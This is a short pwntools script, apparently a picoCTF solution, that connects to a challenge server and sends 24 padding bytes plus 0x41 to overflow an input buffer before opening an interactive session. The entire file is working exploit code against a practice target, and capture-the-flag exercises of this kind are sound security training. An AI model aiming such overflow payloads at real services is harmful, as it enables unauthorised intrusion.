from pwn import *

io = remote('saturn.picoctf.net', 53239)

io.recvuntil(b'string: ')
io.sendline(b'i'*24 + b'\x41')
io.interactive()